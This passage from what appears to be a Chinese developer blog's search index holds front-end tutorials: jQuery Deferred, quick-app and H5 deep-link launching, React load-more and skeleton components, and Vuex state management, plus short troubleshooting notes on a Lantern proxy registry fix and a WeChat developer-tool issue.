image.png image.png 4.2 diff 实现过程 patch(container, vnode) 和 patch(vnode, newVnode) createElment updateChildren","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"虚拟DOM","slug":"虚拟DOM","permalink":"https://ru23.com/tags/虚拟DOM/"}]},{"title":"jQuery的deferred对象详解","slug":"2018-10-jquery-deferred","date":"2018-10-20T13:50:43.000Z","updated":"2018-10-24T03:46:03.341Z","comments":true,"path":"note/d841583b.html","link":"","permalink":"https://ru23.com/note/d841583b.html","excerpt":"","text":"转载于互联网 一、什么是deferred对象？ 开发网站的过程中，我们经常遇到某些耗时很长的javascript操作。其中，既有异步的操作（比如ajax读取服务器数据），也有同步的操作（比如遍历一个大型数组），它们都不是立即能得到结果的。 通常的做法是，为它们指定回调函数（callback）。即事先规定，一旦它们运行结束，应该调用哪些函数。 但是，在回调函数方面，jQuery的功能非常弱。为了改变这一点，jQuery开发团队就设计了deferred对象。 简单说，deferred对象就是jQuery的回调函数解决方案。在英语中，defer的意思是”延迟”，所以deferred对象的含义就是”延迟”到未来某个点再执行。 它解决了如何处理耗时操作的问题，对那些操作提供了更好的控制，以及统一的编程接口。它的主要功能，可以归结为四点 二、ajax操作的链式写法 首先，回顾一下jQuery的ajax操作的传统写法： 12345678910111213$.ajax(&#123; url: \"test.html\", success: function()&#123; alert(\"哈哈，成功了！\"); &#125;, error:function()&#123; alert(\"出错啦！\"); &#125; &#125;); 在上面的代码中，$.ajax()接受一个对象参数，这个对象包含两个方法：success方法指定操作成功后的回调函数，error方法指定操作失败后的回调函数。 $.ajax()操作完成后，如果使用的是低于1.5.0版本的jQuery，返回的是XHR对象，你没法进行链式操作；如果高于1.5.0版本，返回的是deferred对象，可以进行链式操作。 现在，新的写法是这样的： 12345$.ajax(\"test.html\") .done(function()&#123; alert(\"哈哈，成功了！\"); &#125;) .fail(function()&#123; alert(\"出错啦！\"); &#125;); 可以看到，done()相当于success方法，fail()相当于error方法。采用链式写法以后，代码的可读性大大提高 三、指定同一操作的多个回调函数 deferred对象的一大好处，就是它允许你自由添加多个回调函数。 还是以上面的代码为例，如果ajax操作成功后，除了原来的回调函数，我还想再运行一个回调函数，怎么办？ 很简单，直接把它加在后面就行了。 1234567 $.ajax(\"test.html\") .done(function()&#123; alert(\"哈哈，成功了！\");&#125; ) .fail(function()&#123; alert(\"出错啦！\"); &#125; ) .done(function()&#123; alert(\"第二个回调函数！\");&#125; ); 回调函数可以添加任意多个，它们按照添加顺序执行 四、为多个操作指定回调函数 deferred对象的另一大好处，就是它允许你为多个事件指定一个回调函数，这是传统写法做不到的。 请看下面的代码，它用到了一个新的方法$.when()： 12345$.when($.ajax(\"test1.html\"), $.ajax(\"test2.html\")) .done(function()&#123; alert(\"哈哈，成功了！\"); &#125;) .fail(function()&#123; alert(\"出错啦！\"); &#125;); 这段代码的意思是，先执行两个操作$.ajax(“test1.html”)和$.ajax(“test2.html”)，如果都成功了，就运行done()指定的回调函数；如果有一个失败或都失败了，就执行fail()指定的回调函数 五、普通操作的回调函数接口（上） deferred对象的最大优点，就是它把这一套回调函数接口，从ajax操作扩展到了所有操作。也就是说，任何一个操作—-不管是ajax操作还是本地操作，也不管是异步操作还是同步操作—-都可以使用deferred对象的各种方法，指定回调函数。 我们来看一个具体的例子。假定有一个很耗时的操作wait： 1234567891011var wait = function()&#123; var tasks = function()&#123; alert(\"执行完毕！\"); &#125;; setTimeout(tasks,5000); &#125;; 我们为它指定回调函数，应该怎么做呢？ 很自然的，你会想到，可以使用$.when()： 12345$.when(wait()) .done(function()&#123; alert(\"哈哈，成功了！\"); &#125;) .fail(function()&#123; alert(\"出错啦！\"); &#125;); 但是，这样写的话，done()方法会立即执行，起不到回调函数的作用。原因在于$.when()的参数只能是deferred对象，所以必须对wait()进行改写： 1234567891011121314151617 var dtd = $.Deferred(); // 新建一个deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert(\"执行完毕！\"); dtd.resolve(); // 改变deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd; &#125;; 现在，wait()函数返回的是deferred对象，这就可以加上链式操作了。 12345$.when(wait(dtd)) .done(function()&#123; alert(\"哈哈，成功了！\"); &#125;) .fail(function()&#123; alert(\"出错啦！\"); &#125;); wait()函数运行完，就会自动运行done()方法指定的回调函数。 六、deferred.resolve()方法和deferred.reject()方法 jQuery规定，deferred对象有三种执行状态—-未完成，已完成和已失败。如果执行状态是”已完成”（resolved）,deferred对象立刻调用done()方法指定的回调函数；如果执行状态是”已失败”，调用fail()方法指定的回调函数；如果执行状态是”未完成”，则继续等待，或者调用progress()方法指定的回调函数（jQuery1.7版本添加） 1234567891011121314151617181920212223var dtd = $.Deferred(); // 新建一个Deferred对象 var wait = function(dtd)&#123; var tasks = function()&#123; alert(\"执行完毕！\"); dtd.reject(); // 改变Deferred对象的执行状态 &#125;; setTimeout(tasks,5000); return dtd; &#125;; $.when(wait(dtd)) .done(function()&#123; alert(\"哈哈，成功了！\"); &#125;) .fail(function()&#123; alert(\"出错啦！\"); &#125;); 七、小结：deferred对象的方法 （1） $.Deferred() 生成一个deferred对象。 （2） deferred.done() 指定操作成功时的回调函数 （3） deferred.fail() 指定操作失败时的回调函数 （4） deferred.promise() 没有参数时，返回一个新的deferred对象，该对象的运行状态无法被改变；接受参数时，作用为在参数对象上部署deferred接口。 （5） deferred.resolve() 手动改变deferred对象的运行状态为”已完成”，从而立即触发done()方法。 （6）deferred.reject() 这个方法与deferred.resolve()正好相反，调用后将deferred对象的运行状态变为”已失败”，从而立即触发fail()方法。 （7） $.when() 为多个操作指定回调函数。 除了这些方法以外，deferred对象还有二个重要方法，上面的教程中没有涉及到。 （8）deferred.then() 有时为了省事，可以把done()和fail()合在一起写，这就是then()方法 123 $.when($.ajax( &quot;/main.php&quot; )) .then(successFunc, failureFunc ); 如果then()有两个参数，那么第一个参数是done()方法的回调函数，第二个参数是fail()方法的回调方法。如果then()只有一个参数，那么等同于done()","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"jQuery","slug":"jQuery","permalink":"https://ru23.com/tags/jQuery/"},{"name":"Deferred","slug":"Deferred","permalink":"https://ru23.com/tags/Deferred/"}]},{"title":"好物快应用、H5端开发小结","slug":"2018-10-goods-app-summary","date":"2018-10-19T08:50:43.000Z","updated":"2018-10-24T03:46:03.339Z","comments":true,"path":"note/7bec924e.html","link":"","permalink":"https://ru23.com/note/7bec924e.html","excerpt":"","text":"一、deepLink跳转1.1 快应用中呼起deepLink第一步：检测是安装了app 前提条件：需要知道app的包名 123456789101112131415// 判断用户是否安装了appexport const checkInstalledApp = (pkg_name) =&gt; &#123; const pkg = require('@system.package') return new Promise((resolve,reject)=&gt;&#123; pkg.hasInstalled(&#123; package: pkg_name, success: function (data) &#123; resolve(data.result) //返回true、false &#125;, fail: function (data, code) &#123; reject(code) &#125; &#125;) &#125;)&#125; 第二步：调起deepLink 12345678910111213141516171819let pkg = 'com.newsqq.fda' // 传入包名let deep_link = '' // 跳转到app的地址let params = &#123;&#125;checkInstalledApp(pkg).then(hasInstalledApp=&gt;&#123; // 用户已经安装了app, deep_link直接跳转 if(hasInstalledApp &amp;&amp; deep_link)&#123; params = &#123;uri:deep_link&#125; &#125;else&#123; // 否则跳转到H5地址 params = &#123; uri:'Webview',//对应于manifest中的配置 params:&#123; url, title:goods_name &#125; &#125; &#125; this.$app.$def.router.push(params)&#125;) 1.2 H5页面呼起快应用 引入快应用官方提供的代码,这里做了一下处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475export const quickapp = (function()&#123; !function(e) &#123; \"use strict\"; window.appRouter = function(e, t, a, o) &#123; return a = a || &#123;&#125;, o &amp;&amp; (a.__PROMPT__ = 1, a.__NAME__ = o), n(e, t, a) &#125;, window.installShortcut = function(e, t) &#123; return n(\"command\", \"\", &#123; type: \"shortcut\", package: e, name: t &#125;) &#125;, window.channelReady = function(e) &#123; var n = &#123; available: new Function, availableTimeout: 2e3 &#125;; return \"function\" == typeof e ? n.available = e: \"object\" == typeof e &amp;&amp; function(e, n) &#123; n = n || &#123;&#125;; for (var t in n) e[t] = n[t] &#125; (n, e), function(e) &#123; var n = \"http://thefatherofsalmon.com/images\", t = document.createElement(\"img\"); if (t.style.width = \"1px\", t.style.height = \"1px\", t.style.display = \"none\", n += \"/\" + 1e20 * Math.random(), t.src = n, document.body.appendChild(t), t.complete) e.available.call(null, !0); else &#123; t.onload = function() &#123; clearTimeout(a), e.available.call(null, !0) &#125;; var a = setTimeout(function() &#123; e.available.call(null, !1) &#125;, e.availableTimeout) &#125; &#125; (n) &#125;; function n(e, n, t) &#123; var a = \"http://thefatherofsalmon.com/\", o = \"\"; if (e &amp;&amp; (a = a + \"?i=\" + e), n &amp;&amp; (a = a + \"&amp;p=\" + n), function(e) &#123; if (!e) return ! 0; var n = void 0; for (n in e) return ! 1; return ! 0 &#125; (t)) &#123; var i = window.location.search; i.indexOf(\"?\") &gt; -1 &amp;&amp; (o = i.substr(1)) &#125; else &#123; o = Object.keys(t).map(function(e) &#123; return e + \"=\" + encodeURIComponent(t[e]) &#125;).join(\"&amp;\") &#125; \"\" !== o &amp;&amp; (a = a + \"&amp;a=\" + encodeURIComponent(o)); var l = document.createElement(\"img\"); l.src = a, l.style.width = \"1px\", l.style.height = \"1px\", l.style.display = \"none\", document.body.appendChild(l) &#125; &#125; (); return &#123; appRouter:window.appRouter, installShortcut:window.installShortcut, channelReady:window.channelReady &#125;&#125;)() 或者在网页中嵌入以下 js，支持HTTP与HTTPS访问。上面的代码和这个一样的，只是做了一下模块化处理 1&lt;script type=\"text/javascript\" src=\"//statres.quickapp.cn/quickapp/js/routerinline.min.js\"&gt;&lt;/script&gt; 调起应用 appRouter(packageName, path, params, confirm)，更多详情 第一步：检测手机型号 只有在对应的应用商店上架才可以打开 主要用到了这个库 https://github.com/hgoebl/mobile-detect.js 123456789101112131415161718192021222324252627282930313233343536// 检测手机型号export const checkPhone = ()=&gt;&#123; const MobileDetect = require('mobile-detect') let device_type = navigator.userAgent;//获取userAgent信息 let md = new MobileDetect(device_type);//初始化mobile-detect let os = md.os();//获取系统 let model = \"\"; //判断数组中是否包含某字符串 Array.prototype.contains = function(needle) &#123; for (i in this) &#123; if (this[i].indexOf(needle) &gt; 0) return i; &#125; return -1; &#125; if (os == \"iOS\") &#123;//ios系统的处理 os = md.os() + md.version(\"iPhone\"); model = md.mobile(); &#125; else if (os == \"AndroidOS\") &#123;//Android系统的处理 os = md.os() + md.version(\"Android\"); var sss = device_type.split(\";\"); var i = sss.contains(\"Build/\"); if (i &gt; -1) &#123; model = sss[i].substring(0, sss[i].indexOf(\"Build/\")); &#125; let phoneModel = model.toLocaleLowerCase() //判断是否是oppo if(phoneModel.indexOf('oppo')!==-1)&#123; return true &#125; &#125; return false&#125; 第二步：调起快应用 以呼起OPPO手机下已经上架的快应用为例 12345678910111213141516171819// H5页面中呼起快应用// page你所在的页面标志，goods_id是传递的参数export const openQuickapp = (&#123;page,goods_id&#125;)=&gt;&#123; const appRouter = (path,params=&#123;&#125;)=&gt;quickapp.appRouter('com.yesdat.poem',`/$&#123;path&#125;`,params) // 检测OPPO手机下呼起唐诗三百首快应用首页 if(!checkPhone())&#123; return false &#125; if(page == 'home')&#123; appRouter('Home') &#125;else if(page == 'detail')&#123; appRouter('Detail',&#123;goods_id&#125;) &#125;else if(page == 'search')&#123; appRouter('Search') &#125;&#125; 1.3 H5页面呼起deepLink H5 页检测手机是否安装 app 相关流程 uri获取 这里的uri,指得就是通过 Url scheme 来实现的H5与安卓、苹果应用之间的跳转链接。 我们需要找到客户端的同事，来获取如下格式的链接。 1xx://&apos;跳转页面&apos;/&apos;携带参数&apos; 简单解释下url scheme。 url 就是我们平常理解的链接。 scheme 是指url链接中的最初位置，就是上边链接中 ‘xx’的位置。 详细介绍可以看这里：使用url scheme详解 用这个链接我们可以跳转到 应用中的某个页面,并可以携带一定的参数 具体实现 第一步：通过iframe打开App Android平台则各个app厂商差异很大，比如Chrome从25及以后就不再支持通过js触发（非用户点击），所以这里使用iframe src地址等来触发scheme。 1234//在iframe 中打开APPvar ifr = document.createElement('iframe');ifr.src = openUrl;ifr.style.display = 'none'; 第二步： 判断是否安装某应用 原理：若通过url scheme 打开app成功，那么当前h5会进入后台，通过计时器会有明显延迟。利用时间来判断。 由于安卓手机,页面进入后台，定时器setTimeout仍会不断运行，所以这里使用setInterval,较小间隔时间重复多次。来根据累计时间判断。 根据返回true false来判断是否安装。 document.hidden对大于4.4 webview支持很好，为页面可见性api 123456789101112131415161718192021222324252627// 检测app是否安装 export const hasInstalledApp = (deepLink)=&gt;&#123; return new Promise((resolve,reject)=&gt;&#123; var timeout, t = 1000, hasApp = true; setTimeout(function () &#123; if (hasApp) &#123; resolve(true) &#125; else &#123; resolve(false) &#125; document.body.removeChild(ifr); &#125;, 2000) var t1 = Date.now(); var ifr = document.createElement(\"iframe\"); ifr.setAttribute('src', deepLink); ifr.setAttribute('style', 'display:none'); document.body.appendChild(ifr); timeout = setTimeout(function () &#123; var t2 = Date.now(); if (!t1 || t2 - t1 &lt; t + 100) &#123; hasApp = false; &#125; &#125;, t); &#125;)&#125; 使用方式 123456789101112// deep_link与h5链接跳转区分if(deepLink)&#123; Toast.loading('正在跳转中...',0) hasInstalledApp(deepLink).then(hasInstall=&gt;&#123; Toast.hide() if(!hasInstall)&#123;//未安装 直接跳H5 window.location.href = h5Url &#125; &#125;)&#125;else&#123; window.location.href = h5Url&#125; 二、剪贴板分享 主要是使用到clipboard简化 12345678910111213141516171819202122232425import ClipboardJS from 'clipboard'class Test extends Component &#123; showShare = ()=&gt;&#123; //实例化 ClipboardJS对象; const copyBtn = new ClipboardJS('.copyBtn'); copyBtn.on(\"success\",function(e)&#123; // 复制成功 Toast.info('复制成功，可分享到微信、浏览器打开',2); &#125;); copyBtn.on(\"error\",function(e)&#123; //复制失败； Toast.fail(`复制失败$&#123;e.action&#125;`,1); &#125;); &#125;&#125;//复制功能：需要复制的文本内容传递data-clipboard-text，定义类copyBtn用于实例化 &lt;Flex.Item data-clipboard-text=&#123;window.location.href&#125; className=\"copyBtn\" onClick=&#123;()=&gt;showShare()&#125;&gt; &lt;IconWrapper&gt;&lt;IoMdShare/&gt;&lt;/IconWrapper&gt;复制&lt;/Flex.Item&gt; 更多使用方式详情：https://github.com/zenorocha/clipboard.js 三、加载更多 h5页面需要分页加载优化，react中为例 第一步：封装一个loadMore组件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import React from 'react'import PropTypes from 'prop-types';import &#123; Spin &#125; from 'antd';import styled from 'styled-components'const LoadMoreWrapper = styled.div` border-top: 1px dashed #ddd; .load-more&#123; text-align: center; padding: 10px 0; background-color: #fff; color: #999; &#125;`class LoadMore extends React.Component &#123; constructor(props, context) &#123; super(props, context); &#125; _loadMoreHandle()&#123; // 执行传递过来的loadMoreData this.props.loadMoreFn() &#125; render() &#123; const &#123;hasMore&#125; = this.props return ( &lt;LoadMoreWrapper&gt; &lt;div className=\"load-more\" ref='wrapper'&gt; &#123; this.props.isLoadingMore &amp;&amp; hasMore ? &lt;span className=\"loading\"&gt;&lt;Spin tip=\"Loading...\"/&gt; &lt;/span&gt; : (hasMore?&lt;span onClick=&#123;this._loadMoreHandle.bind(this)&#125;&gt;加载更多&lt;/span&gt;:&lt;span&gt;没有更多了&lt;/span&gt;) &#125; &lt;/div&gt; &lt;/LoadMoreWrapper&gt; ) &#125; componentDidMount()&#123; const wrapper = this.refs.wrapper; let timeoutId; window.addEventListener('scroll',()=&gt;&#123; if (this.props.isLoadingMore) return; if(timeoutId) clearTimeout(timeoutId); timeoutId = setTimeout(()=&gt;&#123; // 获取加载更多这个节点距离顶部的距离 const top = wrapper.getBoundingClientRect().top; const windowHeight = window.screen.height; if (top &amp;&amp; top &lt; windowHeight) &#123; // 当wrapper已经在页面可视范围之内触发 this.props.loadMoreFn(); &#125; &#125;,50) &#125;,false) &#125;&#125;LoadMore.propTypes = &#123; isLoadingMore:PropTypes.bool.isRequired, hasMore:PropTypes.bool.isRequired, loadMoreFn:PropTypes.func.isRequired&#125;export default LoadMore 第二步：处理分页 需要后台支持分页 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import React, &#123;Component&#125; from 'react'class Home extends Component &#123; state = &#123; goodsList:[], // 存储列表信息 hasMore:true, // 记录当前状态下还有没有更多的数据可供加载 isLoadingMore:false, //记录当前状态下，是加载中，还是点击可加载更多 page:1, //页码 &#125; constructor(props) &#123; super(props) &#125; componentDidMount() &#123; // 获取首屏数据 this.props.fetchTopGoods(&#123;page:this.state.page&#125;) &#125; // 加载更多 _loadMoreData()&#123; const &#123;topGoods&#125; = this.props const _this = this _this.setState(&#123; isLoadingMore:true &#125;) if(_this.state.hasMore)&#123; _this.setState(&#123;page:++_this.state.page&#125;)// 页码累加 _this.props.fetchGoods(&#123;page:_this.state.page&#125;).then(res=&gt;&#123; const data = res.goods.list let dataList = _this.state.goodsList if(!dataList.length)&#123; dataList = topGoods.data &#125; if(data &amp;&amp; data.length &lt; PAGE_SIZE) &#123; _this.setState(&#123; hasMore:false &#125;) &#125;else&#123; _this.setState(&#123; goodsList:dataList.concat(data), hasMore:true, isLoadingMore:false &#125;) &#125; &#125;) &#125;else&#123; this.setState(&#123; isLoadingMore:false &#125;) &#125; &#125; render() &#123; return &lt;LoadMore isLoadingMore=&#123;this.state.isLoadingMore&#125; hasMore=&#123;this.state.hasMore&#125; loadMoreFn=&#123;this._loadMoreData.bind(this)&#125; /&gt; &#125;&#125; 四、搜索历史封装cache 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import storage from 'good-storage'const SEARCH_KEY = '__search__'const SEARCH_MAX_LEN = 15 // 最大保存15条// 搜索条目更新到数组中function insertArray(arr, val, compare, maxLen) &#123; const index = arr.findIndex(compare) if (index === 0) &#123; return &#125; if (index &gt; 0) &#123; arr.splice(index, 1) &#125; arr.unshift(val) if (maxLen &amp;&amp; arr.length &gt; maxLen) &#123; arr.pop() &#125;&#125;// 从数组中移除function deleteFromArray(arr, compare) &#123; const index = arr.findIndex(compare) if (index &gt; -1) &#123; arr.splice(index, 1) &#125;&#125;// 暴露方法：保存搜索关键词 query传入的关键词export function saveSearch(query) &#123; let searches = storage.get(SEARCH_KEY, []) insertArray(searches, query, (item) =&gt; &#123; return item === query &#125;, SEARCH_MAX_LEN) storage.set(SEARCH_KEY, searches) return searches&#125;// 暴露方法: 逐条删除搜索记录 query传入的历史记录export function deleteSearch(query) &#123; let searches = storage.get(SEARCH_KEY, []) deleteFromArray(searches, (item) =&gt; &#123; return item === query &#125;) storage.set(SEARCH_KEY, searches) return searches&#125;// 暴露方法: 清空所有历史export function clearSearch() &#123; storage.remove(SEARCH_KEY) return []&#125;// 暴露方法: 加载所有历史记录export function loadSearch() &#123; return storage.get(SEARCH_KEY, [])&#125; search-history 五、骨架屏的应用 封装一个骨架屏组件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283import React,&#123;PureComponent&#125; from 'react'import PropTypes from 'prop-types';import &#123; Spin &#125; from 'antd';import styled from 'styled-components'const Wrapper = styled.div` .skeleton &#123; display: flex; padding: 10px; width: 380px; &#125; .skeleton .skeleton-head, .skeleton .skeleton-title, .skeleton .skeleton-content &#123; background: rgba(220, 228, 232, 0.41); &#125; .skeleton .skeleton-head&#123; padding:20px; margin-right:10px; &#125; .skeleton-body &#123; width: 100%; &#125; .skeleton-title &#123; width: 100%; height: 15px; transform-origin: left; animation: skeleton-stretch .5s linear infinite alternate; border-radius: 5px; &#125; .skeleton-content &#123; width: 100%; height: 15px; margin-top: 10px; transform-origin: left; animation: skeleton-stretch .5s -.3s linear infinite alternate; border-radius: 5px; &#125; @keyframes skeleton-stretch &#123; from &#123; transform: scalex(1); &#125; to &#123; transform: scalex(.3); &#125; &#125;`export default class Skeleton extends PureComponent &#123; constructor(props, context) &#123; super(props, context); &#125; render() &#123; const &#123;count&#125; = this.props const arr = [] if(count)&#123; for(let i=0;i&lt;count;i++)&#123; arr.push(&#123;&#125;) &#125; &#125; return ( &lt;Wrapper&gt; &#123;arr.map(v=&gt;&lt;div className=\"skeleton\"&gt; &lt;div className=\"skeleton-head\"&gt;&lt;/div&gt; &lt;div className=\"skeleton-body\"&gt; &lt;div className=\"skeleton-title\"&gt;&lt;/div&gt; &lt;div className=\"skeleton-content\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;)&#125; &lt;/Wrapper&gt; ) &#125;&#125;Skeleton.propTypes = &#123; count:PropTypes.number.isRequired&#125; 使用 12// count 显示的条数&lt;Skeleton count=&#123;10&#125;/&gt; Skeleton H5端在线体验 http://goods.yesdat.com 快应用端在OPPO应用商店搜“好物”（标有快应用的那个）","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"快应用","slug":"快应用","permalink":"https://ru23.com/tags/快应用/"}]},{"title":"vuex学习笔记","slug":"2018-10-vuex学习笔记","date":"2018-10-17T09:25:59.000Z","updated":"2018-10-25T09:26:42.966Z","comments":true,"path":"note/caef00ab.html","link":"","permalink":"https://ru23.com/note/caef00ab.html","excerpt":"","text":"组件是Vue最强大的功能之一，而组件实例的作用域是相互独立的，意味着不同组件之间的数据是无法相互使用。组件间如何传递数据就显得至关重要，这篇文章主要是介绍Vuex。尽量以通俗易懂的实例讲述这其中的差别，希望对小伙伴有些许帮助。 一、Vuex 是什么？Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。 二、什么是“状态管理模式”？一个简单的 Vue 计数应用开始：123456789101112131415161718new Vue(&#123; // state data () &#123; return &#123; count: 0 &#125; &#125;, // view template: ` &lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt; `, // actions methods: &#123; increment () &#123; this.count++ &#125; &#125;&#125;) 这个状态自管理应用包含以下几个部分： state，驱动应用的数据源；view，以声明方式将 state 映射到视图；actions，响应在 view 上的用户输入导致的状态变化。 111 state 的数据会在 view 上显示出来，用户会根据 view 上的内容进行操作，从而触发 actions，接着再去影响 state（vue 是单向数据流的方式驱动的）。 当我们的应用遇到多个组件共享状态时，单向数据流的简洁性很容易被破坏。下面的图，是把组件的共享状态抽取出来，以一个全局单例模式管理。 222 三、核心概念1. statestate：页面状态管理容器对象。集中存储Vue components中data对象的零散数据，以进行统一的状态管理。页面显示所需的数据从该对象中进行读取。1234&lt;div&gt; &#123;&#123; $store.state.count &#125;&#125;&lt;/div&gt; console.log(this.$store.state.count) 2. gettersgetters：Vuex 允许我们在 store 中定义“getter”（可以认为是 store 的计算属性）。就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。（getters从表面是获得的意思，可以把他看作在获取数据之前进行的一种再编辑,相当于对数据的一个过滤和加工。getters就像计算属性一样，getter 的返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。） 定义getter：12345getters: &#123; done(state) &#123; return state.count + 1; &#125;,&#125; 3. mutationsmutations：更改 Vuex 的 store 中的状态的唯一方法是提交 mutation。Vuex 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 state 作为第一个参数：1234567891011const store = new Vuex.Store(&#123; state: &#123; count: 1 &#125;, mutations: &#123; increment (state) &#123; // 变更状态 state.count++ &#125; &#125;&#125;) 组件通过commit提交mutations的方式来请求改变state1this.$store.commit('increment') 提交载荷（Payload）mutations方法中是可以传参的，具体用法如下：1234567 mutations: &#123; // 提交载荷 Payload add(state, n) &#123; state.count += n &#125; &#125;,this.$store.commit('add', 10) ###### 4.ActionAction：类似于 mutation，不同在于Action 提交的是 mutation，而不是直接变更状态；Action 可以包含任意异步操作。123456789101112131415const store = new Vuex.Store(&#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; state.count++ &#125; &#125;, actions: &#123; increment (context) &#123; context.commit('increment') &#125; &#125;&#125;) 不同于mutations使用commit方法，actions使用dispatch方法。1this.$store.dispatch('incrementAsync') contextcontext是与 store 实例具有相同方法和属性的对象。可以通过context.state和context.getters来获取 state 和 getters。以载荷形式分发123456incrementAsyncWithValue (context, value) &#123; setTimeout(() =&gt; &#123; context.commit('add', value) &#125;, 1000)&#125;this.$store.dispatch('incrementAsyncWithValue', 5) 5.Module由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。 为了解决以上问题，Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：12345678910111213141516171819202122const moduleA = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;, getters: &#123; ... &#125;&#125;const moduleB = &#123; state: &#123; ... &#125;, mutations: &#123; ... &#125;, actions: &#123; ... &#125;&#125;const store = new Vuex.Store(&#123; modules: &#123; a: moduleA, b: moduleB &#125;&#125;)store.state.a // -&gt; moduleA 的状态store.state.b // -&gt; moduleB 的状态 模块的局部状态对于模块内部的 mutation 和 getter，接收的第一个参数是模块的局部状态对象。1234567891011121314const moduleA = &#123; state: &#123; count: 0 &#125;, mutations: &#123; increment (state) &#123; // 这里的 `state` 对象是模块的局部状态 state.count++ &#125; &#125;, getters: &#123; doubleCount (state) &#123; return state.count * 2 &#125; &#125;&#125; Vuex计数器的例子：在src目录下创建一个store文件夹。 store/store.js12345678910111213141516171819202122232425262728import Vue from 'vue'import Vuex from 'vuex'Vue.use(Vuex)const store = new Vuex.Store(&#123; state: &#123; count: 0, show: '' &#125;, getters: &#123; counts: (state) =&gt; &#123; return state.count &#125; &#125;, mutations: &#123; increment: (state) =&gt; &#123; state.count++ &#125;, decrement: (state) =&gt; &#123; state.count-- &#125;, changVal: (state, v) =&gt; &#123; state.show = v &#125; &#125;&#125;)export default store state就是我们的需要的状态，状态的改变只能通过提交mutations,例如：123increase() &#123; this.$store.commit('increment') &#125; 带有载荷的提交方式：123changObj () &#123; this.$store.commit('changVal', this.obj)&#125; 载荷也可以是一个对象，这样可以提交多个参数。12345changObj () &#123; this.$store.commit('changVal', &#123; key:'' &#125;)&#125; 在main.js中引入store.js12345678910import store from './store/store'export default new Vue(&#123; el: '#app', router, store, components: &#123; App &#125;, template: '&lt;App/&gt;'&#125;) 在组件中使用在组建可以通过$store.state.count获得状态更改状态只能以提交mutation的方式。123456789101112131415161718192021222324252627282930313233343536&lt;div class=\"store\"&gt; &lt;p&gt; &#123;&#123;$store.state.count&#125;&#125; &lt;/p&gt; &lt;button @click=\"increase\"&gt;&lt;strong&gt;+&lt;/strong&gt;&lt;/button&gt; &lt;button @click=\"decrease\"&gt;&lt;strong&gt;-&lt;/strong&gt;&lt;/button&gt; &lt;hr&gt; &lt;h3&gt;&#123;&#123;$store.state.show&#125;&#125;&lt;/h3&gt; &lt;input placeholder=\"请输入内容\" v-model=\"obj\" @change=\"changObj\" clearable&gt; &lt;/input&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; data () &#123; return &#123; obj: '' &#125; &#125;, methods: &#123; increase() &#123; this.$store.commit('increment') &#125;, decrease() &#123; this.$store.commit('decrement') &#125;, changObj () &#123; this.$store.commit('changVal', this.obj) &#125; &#125;&#125;&lt;/script&gt;","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"一、Vuex","slug":"一、Vuex","permalink":"https://ru23.com/tags/一、Vuex/"}]},{"title":"蓝灯导致关闭蓝灯后电脑一直异常的解决方案","slug":"2018-10-蓝灯导致关闭蓝灯后电脑一直异常的解决方案","date":"2018-10-04T09:58:17.000Z","updated":"2018-10-24T10:36:03.103Z","comments":true,"path":"note/11224d78.html","link":"","permalink":"https://ru23.com/note/11224d78.html","excerpt":"","text":"电脑关闭Lantern以后发现qq浏览器都没办法上网，这是应为Lantern未完全退出导致，那关闭蓝灯后不能上网怎么解决呢？下面给大家分享关闭蓝灯不能上网的方法。 步骤： 1、按win+r打开运行窗口，输入regedit，如图所示： regedit 2、注册表找到：HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections，然后删除Connections这一目录，如图所示： 删除Connections 以上就是关闭蓝灯后不能上网的解决方法，是不是很简单，有遇到这情况的用户可以参考文中方法进行尝试，希望今天的分享对大家有所帮助。 作者：binkcheng链接：https://www.jianshu.com/p/6193b3410342來源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"踩过的坑","slug":"踩过的坑","permalink":"https://ru23.com/tags/踩过的坑/"}]},{"title":"开发者工具调试网页授权 确认按钮点击无任何反应","slug":"2018-10-开发者工具调试网页授权-确认按钮点击无任何反应","date":"2018-10-02T11:07:15.000Z","updated":"2018-10-24T10:35:51.004Z","comments":true,"path":"note/86c96dc5.html","link":"","permalink":"https://ru23.com/note/86c96dc5.html","excerpt":"","text":"场景： qq 20181002084610 解决方法开发者工具调试网页授权 确认按钮点击无任何反应！！！V1以上就会有这个问题 很迷 我看其他社区的回答 说的是 